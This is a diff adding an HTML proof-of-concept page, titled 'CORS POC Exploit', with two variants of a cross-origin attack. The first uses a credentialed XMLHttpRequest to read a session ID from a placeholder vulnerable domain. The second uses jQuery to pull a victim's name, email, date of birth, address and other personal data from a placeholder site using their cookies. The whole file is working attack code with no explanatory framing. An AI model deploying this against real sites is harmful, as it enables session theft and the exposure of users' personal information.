@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET","https://vulnerableDomain/resource", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
+
+
+
+================ OTHER WAY ================
+
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
+		<script type="text/javascript">
+			$(function() {
+				
+				
+				//	Perfom an ajax http request getting email list
+				$.ajax({
+					url: "http://XYZ.site/ajax.php?fun=getDataUser",
+					crossDomain : true,
+					type : "get",
+					xhrFields: {
+						withCredentials: true
+					},
+					success: function (data) {
+						
+						document.getElementById("name").appendChild(document.createTextNode(data.name));
+						document.getElementById("email").appendChild(document.createTextNode(data.email));
+						document.getElementById("username").appendChild(document.createTextNode(data.username));
+						data.dateOfBirth=data.dateOfBirth.replace("-","/");
+						data.dateOfBirth=data.dateOfBirth.replace("-","/");
+						document.getElementById("dateOfBirth").appendChild(document.createTextNode(data.dateOfBirth));
+						document.getElementById("country").appendChild(document.createTextNode(data.country));
+						document.getElementById("city").appendChild(document.createTextNode(data.city));
+						document.getElementById("address").appendChild(document.createTextNode(data.address));
+						document.getElementById("zipCode").appendChild(document.createTextNode(data.zipCode));
+					
+						
+					},
+					dataType: "json"
+				});
+				
+			});
+		</script>
